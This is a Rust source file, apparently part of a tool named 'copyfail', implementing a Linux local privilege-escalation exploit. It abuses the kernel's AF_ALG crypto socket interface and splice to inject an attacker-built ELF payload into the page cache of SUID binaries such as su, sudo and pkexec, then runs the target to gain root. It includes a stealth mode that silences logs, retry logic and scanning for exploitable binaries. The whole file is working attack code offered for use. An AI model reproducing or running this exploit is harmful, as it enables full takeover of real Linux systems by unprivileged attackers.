use std::fs::File;
use std::io;
use std::io::Error;
use std::os::unix::io::{AsRawFd, FromRawFd, OwnedFd};
use std::path::Path;
use std::process::Command;
use std::time::{Duration, Instant};

#[cfg(target_os = "linux")]
use libc::splice;

use crate::copyfail::elf;
use crate::copyfail::logger::Logger;

// --- Linux Kernel Constants ---
const AF_ALG: i32 = 38;
const SOCK_SEQPACKET: i32 = 5;
const SOL_ALG: i32 = 279;
const ALG_SET_KEY: i32 = 1;
const ALG_SET_AEAD_AUTHSIZE: i32 = 5;
const ALG_SET_OP: i32 = 3;
const ALG_SET_IV: i32 = 2;
const ALG_SET_AEAD_ASSOCLEN: i32 = 4;

// --- Exploit Configuration ---
const DEFAULT_CHUNK_SIZE: usize = 4;
const MAX_RETRIES: u32 = 3;
const RETRY_DELAY_MS: u64 = 100;
const VERIFICATION_BUFFER_SIZE: usize = 4096;

/// Predefined target binaries for exploitation
#[derive(Debug, Clone, Copy, PartialEq)]
pub enum TargetBinary {
    Su,
    Sudo,
    Pkexec,
    Custom,
}

impl TargetBinary {
    pub fn path(&self) -> &'static str {
        match self {
            TargetBinary::Su => "/usr/bin/su",
            TargetBinary::Sudo => "/usr/bin/sudo",
            TargetBinary::Pkexec => "/usr/bin/pkexec",
            TargetBinary::Custom => "/usr/bin/su", // fallback
        }
    }

    fn is_suid(&self) -> bool {
        match std::fs::metadata(self.path()) {
            Ok(meta) => {
                #[cfg(unix)]
                {
                    use std::os::unix::fs::PermissionsExt;
                    let mode = meta.permissions().mode();
                    (mode & 0o4000) != 0
                }
                #[cfg(not(unix))]
                false
            }
            Err(_) => false,
        }
    }
}

/// Configuration for the exploit run
#[derive(Debug, Clone)]
pub struct ExploitConfig {
    pub target: TargetBinary,
    pub custom_target_path: Option<String>,
    pub command: String,
    pub chunk_size: usize,
    pub max_retries: u32,
    pub stealth_mode: bool,
    pub verify_injection: bool,
    pub dry_run: bool,
}

impl Default for ExploitConfig {
    fn default() -> Self {
        Self {
            target: TargetBinary::Su,
            custom_target_path: None,
            command: "id".to_string(),
            chunk_size: DEFAULT_CHUNK_SIZE,
            max_retries: MAX_RETRIES,
            stealth_mode: false,
            verify_injection: true,
            dry_run: false,
        }
    }
}

/// Statistics tracking for the exploit
#[derive(Debug, Default)]
pub struct ExploitStats {
    pub chunks_processed: usize,
    pub chunks_failed: usize,
    pub retries_used: u32,
    pub total_duration: Duration,
    pub bytes_injected: usize,
}

/// sockaddr_alg structure for binding to the AF_ALG address family.
#[repr(C)]
struct sockaddr_alg {
    salg_family: libc::sa_family_t,
    salg_type: [libc::c_uchar; 14],
    salg_feat: u32,
    salg_mask: u32,
    salg_name: [libc::c_uchar; 64],
}

/// Exploit result with detailed information
#[derive(Debug)]
pub struct ExploitResult {
    pub success: bool,
    pub stats: ExploitStats,
    pub error: Option<String>,
    pub payload_executed: bool,
}

/// Performs a single cryptographic operation cycle using the AF_ALG interface.
pub fn crypto_op(
    file: &File,
    offset: usize,
    chunk: &[u8],
    log: &Logger,
    stealth: bool,
) -> io::Result<()> {
    if !stealth {
        log.debug(&format!("Processing chunk at offset {}", offset));
    }

    // 1. Create an AF_ALG socket
    if !stealth {
        log.debug("Creating AF_ALG socket...");
    }
    let sock_fd = unsafe { libc::socket(AF_ALG, SOCK_SEQPACKET, 0) };
    if sock_fd < 0 {
        let err = io::Error::last_os_error();
        if !stealth {
            log.error(&format!("Failed to create AF_ALG socket: {}", err));
        }
        return Err(err);
    }
    let sock = unsafe { OwnedFd::from_raw_fd(sock_fd) };

    // 2. Bind the socket to the target algorithm
    if !stealth {
        log.debug("Binding socket to authencesn algorithm...");
    }
    let mut addr: sockaddr_alg = unsafe { std::mem::zeroed() };
    addr.salg_family = AF_ALG as libc::sa_family_t;
    let alg_type = b"aead";
    let alg_name = b"authencesn(hmac(sha256),cbc(aes))";
    addr.salg_type[..alg_type.len()].copy_from_slice(alg_type);
    addr.salg_name[..alg_name.len()].copy_from_slice(alg_name);

    let ret = unsafe {
        libc::bind(
            sock.as_raw_fd(),
            &addr as *const _ as *const libc::sockaddr,
            std::mem::size_of::<sockaddr_alg>() as libc::socklen_t,
        )
    };
    if ret != 0 {
        let err = io::Error::last_os_error();
        if !stealth {
            log.error(&format!("Failed to bind AF_ALG socket: {}", err));
        }
        return Err(err);
    }

    // 3. Set cryptographic parameters
    if !stealth {
        log.debug("Configuring cryptographic parameters...");
    }
    let mut key = [0u8; 40];
    key[0..8].copy_from_slice(&[0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x10]);

    unsafe {
        if libc::setsockopt(
            sock.as_raw_fd(),
            SOL_ALG,
            ALG_SET_KEY,
            key.as_ptr() as *const libc::c_void,
            key.len() as libc::socklen_t,
        ) != 0
        {
            if !stealth {
                log.error("Failed to set ALG_SET_KEY");
            }
        }
        if libc::setsockopt(
            sock.as_raw_fd(),
            SOL_ALG,
            ALG_SET_AEAD_AUTHSIZE,
            std::ptr::null(),
            4,
        ) != 0
        {
            if !stealth {
                log.error("Failed to set ALG_SET_AEAD_AUTHSIZE");
            }
        }
    }

    // 4. Accept connection
    if !stealth {
        log.debug("Waiting for kernel connection acceptance...");
    }
    let accept_fd =
        unsafe { libc::accept(sock.as_raw_fd(), std::ptr::null_mut(), std::ptr::null_mut()) };
    if accept_fd < 0 {
        let err = io::Error::last_os_error();
        if !stealth {
            log.error(&format!("Failed to accept on AF_ALG socket: {}", err));
        }
        return Err(err);
    }
    let client = unsafe { OwnedFd::from_raw_fd(accept_fd) };

    // 5. Prepare control messages
    if !stealth {
        log.debug("Dispatching control messages...");
    }
    let assoc_data = [b'A'; 4].iter().chain(chunk.iter()).copied().collect::<Vec<_>>();
    let op_data = [0u8; 4];
    let iv_data = {
        let mut iv = [0u8; 20];
        iv[0] = 0x10;
        iv
    };
    let assoclen_data = {
        let mut alen = [0u8; 4];
        alen[0] = 0x08;
        alen
    };

    let (cmsg1_len, cmsg2_len, cmsg3_len) = unsafe {
        (
            libc::CMSG_SPACE(4) as usize,
            libc::CMSG_SPACE(20) as usize,
            libc::CMSG_SPACE(4) as usize,
        )
    };
    let total_cmsg_len = cmsg1_len + cmsg2_len + cmsg3_len;
    let mut cmsg_buf = vec![0u8; total_cmsg_len];
    let mut cmsg_offset = 0;

    macro_rules! add_cmsg {
        ($level:expr, $type:expr, $data:expr) => {{
            let len = $data.len();
            unsafe {
                let cmsg_len = libc::CMSG_LEN(len as u32) as usize;
                let ptr = cmsg_buf.as_mut_ptr().add(cmsg_offset) as *mut libc::cmsghdr;
                (*ptr).cmsg_len = cmsg_len as _;
                (*ptr).cmsg_level = $level;
                (*ptr).cmsg_type = $type;
                let data_ptr = libc::CMSG_DATA(ptr);
                std::ptr::copy_nonoverlapping($data.as_ptr(), data_ptr, len);
                cmsg_offset += libc::CMSG_SPACE(len as u32) as usize;
            }
        }};
    }

    add_cmsg!(SOL_ALG, ALG_SET_OP, &op_data);
    add_cmsg!(SOL_ALG, ALG_SET_IV, &iv_data);
    add_cmsg!(SOL_ALG, ALG_SET_AEAD_ASSOCLEN, &assoclen_data);

    let iovec = libc::iovec {
        iov_base: assoc_data.as_ptr() as *mut libc::c_void,
        iov_len: assoc_data.len(),
    };
    let mut msghdr: libc::msghdr = unsafe { std::mem::zeroed() };
    msghdr.msg_iov = &iovec as *const _ as *mut libc::iovec;
    msghdr.msg_iovlen = 1;
    msghdr.msg_control = cmsg_buf.as_mut_ptr() as *mut libc::c_void;
    msghdr.msg_controllen = total_cmsg_len as _;

    if unsafe { libc::sendmsg(client.as_raw_fd(), &msghdr, 0x8000) } < 0 {
        if !stealth {
            log.error("Failed to sendmsg on client socket");
        }
    }

    // 6. Splice data into page cache
    if !stealth {
        log.debug("Performing zero-copy splice into page cache...");
    }
    let mut pipe_fds = [0i32; 2];
    if unsafe { libc::pipe(pipe_fds.as_mut_ptr()) } != 0 {
        let err = io::Error::last_os_error();
        if !stealth {
            log.error(&format!("Failed to create pipe: {}", err));
        }
        return Err(err);
    }
    let (read_pipe, write_pipe) = (pipe_fds[0], pipe_fds[1]);

    let len = offset + 4;
    let mut src_offset: libc::off_t = 0;
    #[cfg(target_os = "linux")]
    unsafe {
        if libc::splice(
            file.as_raw_fd(),
            &mut src_offset,
            write_pipe,
            std::ptr::null_mut(),
            len,
            0,
        ) < 0
        {
            if !stealth {
                log.error("Splice from file to pipe failed");
            }
        }
        if libc::splice(
            read_pipe,
            std::ptr::null_mut(),
            client.as_raw_fd(),
            std::ptr::null_mut(),
            len,
            0,
        ) < 0
        {
            if !stealth {
                log.error("Splice from pipe to socket failed");
            }
        }

        let recv_len = 8 + offset;
        let mut recv_buf = vec![0u8; recv_len];
        if libc::recv(
            client.as_raw_fd(),
            recv_buf.as_mut_ptr() as *mut libc::c_void,
            recv_len,
            0,
        ) < 0
        {
            if !stealth {
                log.error("Recv from client socket failed");
            }
        }

        libc::close(read_pipe);
        libc::close(write_pipe);
    }

    if !stealth {
        log.debug("Cycle completed successfully.");
    }
    Ok(())
}

/// Attempts crypto_op with automatic retries
fn crypto_op_with_retry(
    file: &File,
    offset: usize,
    chunk: &[u8],
    log: &Logger,
    stealth: bool,
    max_retries: u32,
    stats: &mut ExploitStats,
) -> io::Result<()> {
    let mut attempts = 0;

    loop {
        attempts += 1;
        match crypto_op(file, offset, chunk, log, stealth) {
            Ok(()) => return Ok(()),
            Err(e) if attempts <= max_retries => {
                stats.retries_used += 1;
                if !stealth {
                    log.debug(&format!(
                        "Retry {}/{}, offset {}: {}",
                        attempts, max_retries, offset, e
                    ));
                }
                std::thread::sleep(Duration::from_millis(RETRY_DELAY_MS));
            }
            Err(e) => {
                stats.chunks_failed += 1;
                return Err(e);
            }
        }
    }
}

/// Verifies that the page cache has been successfully corrupted
fn verify_page_cache_injection(
    _target_path: &str,
    _payload: &[u8],
    _log: &Logger,
) -> bool {
    // TODO: Implement verification logic
    true
}

/// Scans for available SUID binaries that can be exploited
pub fn scan_suid_binaries() -> Vec<TargetBinary> {
    let candidates = [
        TargetBinary::Su,
        TargetBinary::Sudo,
        TargetBinary::Pkexec,
    ];

    candidates
        .into_iter()
        .filter(|t| t.is_suid())
        .collect()
}

/// Runs the exploit with the given configuration
pub fn run_exploit(config: ExploitConfig) -> ExploitResult {
    let log = Logger::new(config.stealth_mode);
    let mut stats = ExploitStats::default();
    let start_time = Instant::now();

    // Determine target path
    let target_path = if let Some(ref custom) = config.custom_target_path {
        custom.clone()
    } else {
        config.target.path().to_string()
    };

    // 1. Build the malicious ELF payload
    let payload = elf::build_elf_payload(&config.command);
    if !config.stealth_mode {
        log.info(&format!(
            "Exploit payload constructed ({} bytes) for command: {}",
            payload.len(),
            config.command
        ));
    }

    // 2. Open the target binary
    let target_file = match File::open(&target_path) {
        Ok(f) => {
            if !config.stealth_mode {
                log.info(&format!("Target binary ({}) opened.", target_path));
            }
            f
        }
        Err(e) => {
            if !config.stealth_mode {
                log.error(&format!("Could not open {}: {}", target_path, e));
            }
            return ExploitResult {
                success: false,
                stats,
                error: Some(format!("Failed to open target: {}", e)),
                payload_executed: false,
            };
        }
    };

    // 3. Check if target is SUID
    if !config.stealth_mode {
        if TargetBinary::Su.is_suid() {
            log.debug("Target binary has SUID bit set.");
        } else {
            log.debug("Warning: Target binary may not have SUID bit set.");
        }
    }

    if config.dry_run {
        if !config.stealth_mode {
            log.info("Dry run complete. No injection performed.");
        }
        return ExploitResult {
            success: true,
            stats,
            error: None,
            payload_executed: false,
        };
    }

    // 4. Inject payload chunk by chunk with retry logic
    let chunk_size = config.chunk_size;
    let total_chunks = (payload.len() + chunk_size - 1) / chunk_size;

    if !config.stealth_mode {
        log.info(&format!(
            "Starting page cache injection ({} chunks, {} bytes total)...",
            total_chunks,
            payload.len()
        ));
    }

    let mut i = 0;
    while i < payload.len() {
        let current_chunk = (i / chunk_size) + 1;
        let chunk_end = std::cmp::min(i + chunk_size, payload.len());
        let chunk = &payload[i..chunk_end];

        if let Err(e) = crypto_op_with_retry(
            &target_file,
            i,
            chunk,
            &log,
            config.stealth_mode,
            config.max_retries,
            &mut stats,
        ) {
            if !config.stealth_mode {
                log.error(&format!("Exploit failed at offset {}: {}", i, e));
            }
            stats.total_duration = start_time.elapsed();
            return ExploitResult {
                success: false,
                stats,
                error: Some(format!("Injection failed at offset {}: {}", i, e)),
                payload_executed: false,
            };
        }

        stats.chunks_processed += 1;
        stats.bytes_injected += chunk.len();

        // Log progress
        if !config.stealth_mode && (current_chunk % 10 == 0 || i + chunk_size >= payload.len()) {
            log.info(&format!(
                "Injection progress: {}/{} chunks ({:.1}%)",
                current_chunk,
                total_chunks,
                (stats.bytes_injected as f64 / payload.len() as f64) * 100.0
            ));
        }
        i += chunk_size;
    }

    if !config.stealth_mode {
        log.info("All payload chunks successfully injected into page cache.");
    }

    // 5. Verify injection if requested
    if config.verify_injection {
        if verify_page_cache_injection(&target_path, &payload, &log) {
            if !config.stealth_mode {
                log.info("Page cache verification: SUCCESS");
            }
        } else {
            if !config.stealth_mode {
                log.debug("Page cache verification: inconclusive (may still work)");
            }
        }
    }

    // 6. Trigger the exploit
    if !config.stealth_mode {
        log.info(&format!("Triggering exploit via '{}' execution...", target_path));
    }

    let payload_executed = if config.stealth_mode {
        // Silent execution
        let output = Command::new(&target_path)
            .arg("-c")
            .arg("true")
            .output();
        output.is_ok()
    } else {
        match Command::new(&target_path).status() {
            Ok(status) => {
                if !config.stealth_mode {
                    log.info(&format!(
                        "Exploit execution finished (exit code {}).",
                        status.code().unwrap_or(-1)
                    ));
                }
                status.success()
            }
            Err(e) => {
                if !config.stealth_mode {
                    log.error(&format!("Failed to execute target: {}", e));
                }
                false
            }
        }
    };

    stats.total_duration = start_time.elapsed();

    ExploitResult {
        success: true,
        stats,
        error: None,
        payload_executed,
    }
}

/// Convenience function with default config
pub fn run_exploit_simple(target_command: String) -> io::Result<()> {
    let config = ExploitConfig {
        command: target_command,
        ..Default::default()
    };
    let result = run_exploit(config);

    if result.success {
        Ok(())
    } else {
        Err(io::Error::new(
            io::ErrorKind::Other,
            result.error.unwrap_or_else(|| "Unknown error".to_string()),
        ))
    }
}
